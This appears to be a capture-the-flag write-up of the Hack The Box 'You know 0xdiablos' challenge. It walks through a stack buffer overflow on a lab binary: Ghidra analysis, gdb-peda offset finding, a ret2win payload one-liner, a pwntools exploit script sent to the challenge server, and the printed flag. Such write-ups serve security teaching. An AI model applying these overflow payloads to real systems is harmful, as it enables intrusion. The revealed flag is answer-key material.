---
title: HTB - You know 0xdiablos
date: 2023-12-05
categories: [Challenges, Pwn]
tags: [pwn, ghidra, gdb, gdb-peda, debugging, python, buffer-overflow]
img_path: /assets/0xdiablos/
published: true
---

![room_banner](0xdiablos_banner.png)

## Overview

|:-:|:-:|
|Machine|[You know 0xdiablos](https://app.hackthebox.com/challenges/106)|
|Rank|Easy|
|Time|-|
|Focus|Buffer overflow|

## Challenge

```shell
# unzip archive
7z x You\ know\ 0xDiablos.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,16 CPUs 11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (806D1),ASM,AES-NI)

Scanning the drive for archives:
1 file, 3058 bytes (3 KiB)

Extracting archive: You know 0xDiablos.zip
--
Path = You know 0xDiablos.zip
Type = zip
Physical Size = 3058

# pass: hackthebox
Enter password (will not be echoed):
Everything is Ok

Size:       15656
Compressed: 3058
```

```shell
# check file type
file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped
```

```shell
# check human-readable strings
strings vuln
tdX
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
exit
fopen
puts
printf
fgets
stdout
setresgid
getegid
setvbuf
__libc_start_main
GLIBC_2.1
GLIBC_2.0
__gmon_start__
[^_]
flag.txt
Hurry up and try in on server side.
You know who are 0xDiablos:
;*2$"
GCC: (Debian 8.3.0-19) 8.3.0
...
```

> [Video Walkthrough](https://www.youtube.com/watch?v=nFj5B43KPXo)

1. Launch ghidra > Code Browser > Import File
2. Search for `main` function:

	![](search_main.png)

	![](main_function.png)

3. Double click on `vuln()` function:

	![](vuln_function.png)

	Defining `local_bc` variable with a max size of `180` chars/bits.

	```shell
  # test function
	./vuln
	You know who are 0xDiablos:
	test
	test
	```

4. We need to input something > than 180 chars:

	```shell
  # try to crash it
	python3 -c 'print("A"*185)' | ./vuln
	You know who are 0xDiablos:
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	Segmentation fault
	```

5. Debug the binary with `gdb`:

	> Install [`gdb-peda`](https://github.com/longld/peda).

	```shell
  # debug the program
	gdb -q vuln
	Reading symbols from vuln...
	(No debugging symbols found in vuln)
	gdb-peda$ start
	Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
	Use 'set logging enabled off'.
	
	Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
	Use 'set logging enabled on'.
	
	[Thread debugging using libthread_db enabled]
	Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
	[----------------------------------registers-----------------------------------]
	EAX: 0x80492b1 (<main>: lea    ecx,[esp+0x4])
	EBX: 0xf7f94ff4 --> 0x21dd8c
	ECX: 0xffffcdc0 --> 0x1
	EDX: 0xffffcde0 --> 0xf7f94ff4 --> 0x21dd8c
	ESI: 0x8049330 (<__libc_csu_init>:      push   ebp)
	EDI: 0xf7ffcba0 --> 0x0
	EBP: 0xffffcda8 --> 0x0
	ESP: 0xffffcda0 --> 0xffffcdc0 --> 0x1
	EIP: 0x80492c0 (<main+15>:      sub    esp,0x10)
	EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
	[-------------------------------------code-------------------------------------]
	   0x80492bc <main+11>: mov    ebp,esp
	   0x80492be <main+13>: push   ebx
	   0x80492bf <main+14>: push   ecx
	=> 0x80492c0 <main+15>: sub    esp,0x10
	   0x80492c3 <main+18>: call   0x8049120 <__x86.get_pc_thunk.bx>
	   0x80492c8 <main+23>: add    ebx,0x2d38
	   0x80492ce <main+29>: mov    eax,DWORD PTR [ebx-0x4]
	   0x80492d4 <main+35>: mov    eax,DWORD PTR [eax]
	[------------------------------------stack-------------------------------------]
	0000| 0xffffcda0 --> 0xffffcdc0 --> 0x1
	0004| 0xffffcda4 --> 0xf7f94ff4 --> 0x21dd8c
	0008| 0xffffcda8 --> 0x0
	0012| 0xffffcdac --> 0xf7d9a7c5 (add    esp,0x10)
	0016| 0xffffcdb0 --> 0x1
	0020| 0xffffcdb4 --> 0x0
	0024| 0xffffcdb8 --> 0x78 ('x')
	0028| 0xffffcdbc --> 0xf7d9a7c5 (add    esp,0x10)
	[------------------------------------------------------------------------------]
	Legend: code, data, rodata, value
	
	Temporary breakpoint 1, 0x080492c0 in main ()
	```

6. Create a pattern with 200 chars:

	```shell
  # create a pattern bigger than 180 chars
	gdb-peda$ pattern_create 200 bof.txt
	Writing pattern of 200 chars to filename "bof.txt"
	```

	```shell
  # check that the file was created
	ls
	0xdiablos.gpr   0xdiablos.lock   0xdiablos.lock~   0xdiablos.rep   bof.txt   peda-session-vuln.txt   vuln  You know 0xDiablos.zip  You know 0xDiablos.zip:Zone.Identifier
  ```
  
  ```shell
  # display the content of the file
	cat bof.txt
	AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
	```

7. Run (`r`) the program with `bof.txt` as input:

	```shell
  # run program using box.txt as input
	gdb-peda$ r < bof.txt
	Starting program: /home/kali/htb/you_know_0xdiablos/vuln < bof.txt
	[Thread debugging using libthread_db enabled]
	Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
	You know who are 0xDiablos:
	AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
	
	Program received signal SIGSEGV, Segmentation fault.
	[----------------------------------registers-----------------------------------]
	EAX: 0xc9
	EBX: 0x76414158 ('XAAv')
	ECX: 0xf7f969b8 --> 0x0
	EDX: 0x0
	ESI: 0x8049330 (<__libc_csu_init>:      push   ebp)
	EDI: 0xf7ffcba0 --> 0x0
	EBP: 0x41594141 ('AAYA')
	ESP: 0xffffcd90 ("ZAAxAAyA")
	EIP: 0x41417741 ('AwAA')
	EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
	[-------------------------------------code-------------------------------------]
	Invalid $PC address: 0x41417741
	[------------------------------------stack-------------------------------------]
	0000| 0xffffcd90 ("ZAAxAAyA")
	0004| 0xffffcd94 ("AAyA")
	0008| 0xffffcd98 --> 0xf7d93900 --> 0x78656d ('mex')
	0012| 0xffffcd9c --> 0x3e8
	0016| 0xffffcda0 --> 0xffffcdc0 --> 0x1
	0020| 0xffffcda4 --> 0xf7f94ff4 --> 0x21dd8c
	0024| 0xffffcda8 --> 0x0
	0028| 0xffffcdac --> 0xf7d9a7c5 (add    esp,0x10)
	[------------------------------------------------------------------------------]
	Legend: code, data, rodata, value
	Stopped reason: SIGSEGV
	0x41417741 in ?? ()
	```

  > A standard buffer overflow is **used to overwrite the Extended Instruction Pointer (EIP)**. It is usually possible to predict an appropriate EIP value that will land execution within the NOPs (No Operation) which will “execute” until the payload (usually shellcode) is encountered.

  ```EIP-value
  # we have successfully overflowed the IP
  EIP: 0x41417741 ('AwAA')
  ```

8. We need to find the offset, which will enable us to find the exact location after which we can inject our payload:

	```shell
  # find the offset
	# we use the address of the EIP
	gdb-peda$ pattern_offset 0x41417741
	1094809409 found at offset: 188
	```

  > We need exactly 188 chars/bit to achieve overflow. We usually inject code to achieve RCE, but in this case we need to use the `flag()` function to reveal its value.

9. Find out the start of the `flag()` function:

	```shell
  # find out where the flag function start by disassembling it
	gdb-peda$ disas flag
	Dump of assembler code for function flag:
	   0x080491e2 <+0>:     push   ebp
	   0x080491e3 <+1>:     mov    ebp,esp
	   0x080491e5 <+3>:     push   ebx
	   0x080491e6 <+4>:     sub    esp,0x54
	   0x080491e9 <+7>:     call   0x8049120 <__x86.get_pc_thunk.bx>
	   0x080491ee <+12>:    add    ebx,0x2e12
	   0x080491f4 <+18>:    sub    esp,0x8
	   0x080491f7 <+21>:    lea    eax,[ebx-0x1ff8]
	   0x080491fd <+27>:    push   eax
	   0x080491fe <+28>:    lea    eax,[ebx-0x1ff6]
	   0x08049204 <+34>:    push   eax
	   0x08049205 <+35>:    call   0x80490b0 <fopen@plt>
	   0x0804920a <+40>:    add    esp,0x10
	   0x0804920d <+43>:    mov    DWORD PTR [ebp-0xc],eax
	   0x08049210 <+46>:    cmp    DWORD PTR [ebp-0xc],0x0
	   0x08049214 <+50>:    jne    0x8049232 <flag+80>
	   0x08049216 <+52>:    sub    esp,0xc
	   0x08049219 <+55>:    lea    eax,[ebx-0x1fec]
	   0x0804921f <+61>:    push   eax
	   0x08049220 <+62>:    call   0x8049070 <puts@plt>
	   0x08049225 <+67>:    add    esp,0x10
	   0x08049228 <+70>:    sub    esp,0xc
	   0x0804922b <+73>:    push   0x0
	   0x0804922d <+75>:    call   0x8049080 <exit@plt>
	   0x08049232 <+80>:    sub    esp,0x4
	   0x08049235 <+83>:    push   DWORD PTR [ebp-0xc]
	   0x08049238 <+86>:    push   0x40
	   0x0804923a <+88>:    lea    eax,[ebp-0x4c]
	   0x0804923d <+91>:    push   eax
	   0x0804923e <+92>:    call   0x8049050 <fgets@plt>
	   0x08049243 <+97>:    add    esp,0x10
	   0x08049246 <+100>:   cmp    DWORD PTR [ebp+0x8],0xdeadbeef
	   0x0804924d <+107>:   jne    0x8049269 <flag+135>
	   0x0804924f <+109>:   cmp    DWORD PTR [ebp+0xc],0xc0ded00d
	   0x08049256 <+116>:   jne    0x804926c <flag+138>
	   0x08049258 <+118>:   sub    esp,0xc
	   0x0804925b <+121>:   lea    eax,[ebp-0x4c]
	   0x0804925e <+124>:   push   eax
	   0x0804925f <+125>:   call   0x8049030 <printf@plt>
	   0x08049264 <+130>:   add    esp,0x10
	   0x08049267 <+133>:   jmp    0x804926d <flag+139>
	   0x08049269 <+135>:   nop
	   0x0804926a <+136>:   jmp    0x804926d <flag+139>
	   0x0804926c <+138>:   nop
	   0x0804926d <+139>:   mov    ebx,DWORD PTR [ebp-0x4]
	   0x08049270 <+142>:   leave
	   0x08049271 <+143>:   ret
	End of assembler dump.
	```

  > The `flag` function start at `0x080491e2`. This will need to be injected into the payload.

10. We will need to inject the `flag` function using its starting mem address (in reverse) as well as the mem address of the required two parameters:

	```shell
	# creating the payload
	python3 -c "import sys; sys.stdout.buffer.write(b'A'*188+b'\xe2\x91\x04\x08'+b'test\xef\xbe\xad\xde\x0d\xd0\xde\xc0')" > payload.txt
	
	cat payload.txt
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAtestﾭ�
	```

 > `create_overflow` + `mem_adddress_rev` + `mem_address_param1\mem_addres_param2`

  ```shell
  # send payload to function
  cat payload.txt | ./vuln
  You know who are 0xDiablos:
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAtestﾭ�
  Hurry up and try in on server side.
  ```

  > Function was called successfully as this is the expected output.

11. Grab the provided address `159.65.24.125:30760` and sent the payload there:

  ```shell
  # send the payload on the server side
  cat payload.txt | nc 159.65.24.125 30760
  ```

  > We need to wait some time for the flag to pop up. --> Never came back.

  ```python
  # alternative payload
  from pwn import *

  context.update(arch="i386", os="linux")

  elf = ELF("./vuln")

  # offset to reach right before return address's location
  offset = b"A" * 188

  # craft exploit: offset + flag() + padding + parameter 1 + parameter 2
  exploit = offset + p32(elf.symbols['flag'], endian="little") + p32(0x90909090) + p32(0xdeadbeef, endian="little") + p32(0xc0ded00d, endian="little")

  r = remote("159.65.24.125", 30760)
  #r = elf.process()
  r.sendlineafter(":", exploit)
  r.interactive()
  ```

  ```shell
  # execute payload script
  python3 payload.py
  [*] Checking for new versions of pwntools
      To disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache-3.11/update to 'never' (old way).
      Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
          [update]
          interval=never
  [*] You have the latest version of Pwntools (4.11.1)
  [*] '/home/kali/htb/you_know_0xdiablos/vuln'
      Arch:     i386-32-little
      RELRO:    Partial RELRO
      Stack:    No canary found
      NX:       NX unknown - GNU_STACK missing
      PIE:      No PIE (0x8048000)
      Stack:    Executable
      RWX:      Has RWX segments
  [+] Opening connection to 159.65.24.125 on port 30760: Done
  /home/kali/.local/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
    res = self.recvuntil(delim, timeout=timeout)
  [*] Switching to interactive mode

  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\xde\xc02\x9\x90\x90\x90\HTB{0ur_Buff3r_1s_not_healthy}[*] Got EOF while reading in interactive
  ```

![[0xdiablos_pwed.png]]

<figure>
    <img src="0xdiablos_pwned.png"
    alt="Machine pwned" >
</figure>